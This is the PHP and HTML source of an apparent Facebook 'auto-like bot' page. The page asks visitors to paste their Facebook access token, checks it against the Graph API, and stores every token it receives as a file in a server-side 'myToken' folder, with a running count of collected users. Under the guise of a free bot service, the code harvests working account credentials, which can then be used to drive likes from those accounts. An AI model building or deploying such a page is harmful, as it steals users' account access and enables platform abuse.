<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <link href="https://fonts.googleapis.com/css?family=Audiowide" rel="stylesheet"><html> <meta charset="utf-8"/> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> <head> <title>VISHAL KUMAR</title> <link rel="stylesheet" type="text/css" href="v.css" media="all,handheld"/> <link rel="shortcut icon" type="image/png" href="http://emojipedia-us.s3.amazonaws.com/cache/f9/4e/f94ee8fa6d3c2553f00d59838ab747e3.png"/> <style>
.snow-container{position:fixed;width:100%;max-width:100%;z-index:99999;pointer-events:none;overflow:hidden;top:0;height:100%}.snow{display:block;position:absolute;z-index:2;top:0;right:0;bottom:0;left:0;pointer-events:none;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0);-webkit-animation:snow linear infinite;animation:snow linear infinite}.snow.foreground{background-image:url("https://vipfb.co/img/snow-large-vipfb.co.png");-webkit-animation-duration:15s;animation-duration:10s}.snow.foreground.layered{-webkit-animation-delay:7.5s;animation-delay:7.5s}.snow.middleground{background-image:url(https://vipfb.co/img/snow-medium-vipfb.co.png);-webkit-animation-duration:20s;animation-duration:15s}.snow.middleground.layered{-webkit-animation-delay:10s;animation-delay:10s}.snow.background{background-image:url(https://vipfb.co/img/snow-small-vipfb.co.png);-webkit-animation-duration:25s;animation-duration:20s}.snow.background.layered{-webkit-animation-delay:12.5s;animation-delay:12.5s}@-webkit-keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}}@keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}} </style> <div class='snow-container'> <div class='snow foreground'></div> <div class='snow foreground layered'></div> <div class='snow middleground'></div> <div class='snow middleground layered'></div> <div class='snow background'></div> <div class='snow background layered'></div>
</div> <div id="content"></div> <div class="post"></div> <div class="post-content"><img src="jarvis.png" class="jarvis"><br> <img src="jarvis-inner.png" class="jarvis-inner"></br></div> <div class="post-meta2"></div> 

<script type="text/javascript" src=""></script>
<script language="javascript" type="text/javascript" src="snow.js"></script>

<?php
$yx=opendir('myToken');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> myToken($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function myToken($access){
if(!is_dir('myToken')){
mkdir('myToken');
}
$a=fopen('myToken/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<font color="red">TOKEN INVALID</font>';
$this->form();
}
public function form(){
 echo '
<center> <a target="_blank" href="http://www.facebook.com/topper.vk"><img src="https://graph.facebook.com/100021495444328/picture?type=large" alt="Designer_&_Developer" border="3" style="border-color: 737373; border-radius:70%;height:150px;width:150px;-moz-box-shadow:0px 0px 20px 0px black;-webkit-box-shadow:0px 0px 20px 0px black;-o-box-shadow:0px 0px 20px 0px black;box-shadow:0px 0px 20px 0px black"/></center>
  
<div id="header">

<div id="bottom-content"> <div id="navigation-menu"> <h3><a name="navigation-name" class="no-link">Token Area</a></h3> <li><a href="https://vk-tokenx.herokuapp.com/" target="_blank">Get Token</a>   </li> </div>

<br>

<div id="top-content"> 
<div id="search-form"> 

<form action="index.php" method="post">
<input class="search" type="text" style="height:80px;width:600px;" name="access_token" placeholder="PASTE YOUR TOKEN HRRE">


<input class="inp-btn" type="submit" style="height:80px;width:200px;"  value="Submit"></form></div>

<br>
<center> <font color="white"> MADE BY : <a href="https://www.facebook.com/100021495444328" target="blank"><font color="red">VISHAL KUMAR<br></center>


</div>
</b></a></center></div></div></body></html>';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'
<br>
<br>
<br>
<center> <a target="_blank" href="http://www.facebook.com/100021495444328"> <center> <img src="https://graph.facebook.com/100021495444328/picture?type=large" style="width:300px; height:300px;border: 80px;border-radius: 80%;"  </center>
<br>
<br>
<br>
<marquee direction="left"><font size="10" color="white">Thanks For Using Our Bot || Your bot Has been Activated Successfully </font></marquee>
<br>
<br>
<br>
<form action="keluar.php" method="post">
<center><input class="submit" type="submit" value="Click Here To START BOT"></center>
<br>
<br>
<br>
<center> <font color="yellow"> DESIGN BY :-  <a href="https://www.facebook.com/100021495444328" target="blank"><font color="red">VISHAL KUMAR<br></center>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
</body>
</html>
<h2>
<center><font size="5"><?php // integer starts at 0 before counting
    $i = 0; 
    $dir = 'myToken/';
    if ($handle = opendir($dir)) {
        while (($file = readdir($handle)) !== false){
            if (!in_array($file, array('.', '..')) && !is_dir($dir.$file)) 
                $i++;
        }
    }
    // </strong> prints out how many were in the directory
    echo "USERX : $i "; ?><br></font></p></h2>
